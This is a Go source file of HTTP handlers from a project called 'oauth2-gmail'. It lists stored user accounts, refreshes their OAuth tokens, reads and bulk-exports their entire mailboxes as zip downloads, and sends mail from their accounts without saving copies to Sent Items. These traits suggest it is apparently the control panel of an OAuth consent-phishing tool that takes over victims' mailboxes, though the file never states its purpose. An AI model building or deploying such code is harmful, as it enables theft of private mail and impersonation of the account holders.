package server

import (
	"fmt"
	"github.com/kataras/iris/v12/context"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"oauth2-gmail/api"
	"oauth2-gmail/database"
	"oauth2-gmail/model"
	"strconv"
	"strings"
)

// This will contain the template functions

func ExecuteTemplate(w http.ResponseWriter, page model.Page, templatePath string) {

	tpl, err := template.ParseFiles("templates/main.html", templatePath)
	if err != nil {
		log.Fatal(err)
	}
	tpl.ExecuteTemplate(w, "layout", page)
}

func ExecuteSingleTemplate(w http.ResponseWriter, page model.Page, templatePath string) {

	tpl, err := template.ParseFiles(templatePath)
	if err != nil {
		log.Println(err)
	}

	err = tpl.Execute(w, page)
	if err != nil {
		log.Println(err)
	}

}

func GetUsers(ctx context.Context) {
	Page := model.Page{}
	Page.Title = "Users"
	Page.URL = api.GenerateURL()
	Page.UserList = database.GetUsers()
	ExecuteTemplate(ctx.ResponseWriter(), Page, "templates/users.html")
}

func GetEmail(ctx context.Context) {
	var Page model.Page
	emailID := ctx.Params().Get("email_id")
	id := ctx.Params().Get("id")
	user := database.GetUser(id)
	Page.Mail = api.ViewEmailById(user, emailID) //database.GetEmail(email)
	ExecuteSingleTemplate(ctx.ResponseWriter(), Page, "templates/email.html")
}

//GetLiveMain will give the template
func GetLiveMain(ctx context.Context) {
	Page := model.Page{}
	Page.Title = "Live Interaction"
	id := ctx.Params().Get("id")
	Page.User = database.GetUser(id)
	// Implement a better way for the refreshing
	api.RefreshAccessToken(&Page.User)

	ExecuteTemplate(ctx.ResponseWriter(), Page, "templates/live.html")
}


func ExportAllEmails (ctx context.Context)  {
	id := ctx.Params().Get("id")
	Page := model.Page{}
	Page.User = database.GetUser(id)
	Page.Email = Page.User.Mail
	Page.Title = "Export All E-mails"
	ids := api.GetEmailAllIds(Page.User)
	if len(ids) > 0 {
		Page.User.MailIds = strings.Join(ids, ",")
		database.UpdateUserMailIds(Page.User)
		Page.PageSize = len(ids)
		Page.Sum = len(ids)
		Page.EmailList = api.GetPageEmails(Page.User, 1, Page.PageSize)
		zipFilePath, err := api.GenerateMailHtml(Page.User, Page.EmailList)
		if err != nil {
			ctx.ResponseWriter().Write([]byte(err.Error()))
			return
		}
		bytes, err := ioutil.ReadFile(zipFilePath)
		if err != nil{
			ctx.ResponseWriter().Write([]byte(err.Error()))
			return
		}
		ctx.ResponseWriter().Write(bytes)
	}
	//ExecuteTemplate(w, Page, "templates/emails.html")
}

func GetLiveEmails(ctx context.Context) {
	pageNo := ctx.URLParam("page")
	id := ctx.Params().Get("id")
	Page := model.Page{}
	Page.PageSize = 10
	Page.CurrentPageNumber,_ = strconv.Atoi(pageNo)
	Page.User = database.GetUser(id)
	Page.Email = Page.User.Mail
	Page.Title = "Show All E-mails"
	ids := api.GetEmailAllIds(Page.User)
	if len(ids) > 0 {
		Page.User.MailIds = strings.Join(ids, ",")
		database.UpdateUserMailIds(Page.User)
		Page.Sum = len(ids)
		var PageCount int
		if Page.Sum % Page.PageSize  == 0{
			PageCount = Page.Sum / Page.PageSize
		} else {
			PageCount = Page.Sum / Page.PageSize + 1
		}
		for i := 1; i <= PageCount; i++ {
			Page.PageList = append(Page.PageList, strconv.Itoa(i))
		}
		Page.EmailList = api.GetPageEmails(Page.User, Page.CurrentPageNumber, Page.PageSize)
	}
	ExecuteTemplate(ctx.ResponseWriter(), Page, "templates/emails.html")
}

//SendEmail will send an email to a specific address.
func SendEmail(ctx context.Context) {
	id := ctx.Params().Get("id")
	Page := model.Page{}
	Page.User = database.GetUser(id)
	//r.ParseForm()

	if err := ctx.Request().ParseMultipartForm(5 * 1024); err != nil {
		fmt.Printf("Could not parse multipart form: %v\n", err)

		return
	}

	Page.Title = "Users success"

	email := model.SendEmailStruct{}

	email.Message.Subject = ctx.Request().FormValue("subject")
	email.Message.Body.ContentType = ctx.Request().FormValue("contentType")
	email.Message.Body.Content = ctx.Request().FormValue("message")

	// This code needs fixing .
	emailAddress := model.EmailAddress{Address: ctx.Request().FormValue("emailtarget")}
	target := model.ToRecipients{EmailAddress: emailAddress}
	recp := []model.ToRecipients{target}
	email.Message.ToRecipients = recp
	email.SaveToSentItems = "false"

	// Parse the File
	//file, fileHandler, err := r.FormFile("attachment")
	//if err == nil {
	//
	//	attachment := model.Attachment{}
	//	attachment.OdataType = "#microsoft.graph.fileAttachment"
	//	attachment.Name = fileHandler.Filename
	//	attachment.ContentType = fileHandler.Header["Content-Type"][0]
	//
	//	// Load the attachment
	//	attachmentData, _ := ioutil.ReadAll(file)
	//	encAttachment := b64.StdEncoding.EncodeToString(attachmentData)
	//
	//	attachment.ContentBytes = encAttachment
	//	email.Message.Attachments = []model.Attachment{attachment}
	//	defer file.Close()
	//}

	resp, code := api.SendEmail(Page.User, email)
	if code == 202 {
		Page.Message = "E-mail was sent successfully"

		Page.Success = true
	} else {
		Page.Message = resp
	}
	fmt.Println(resp)

	ExecuteTemplate(ctx.ResponseWriter(), Page, "templates/message.html")
}
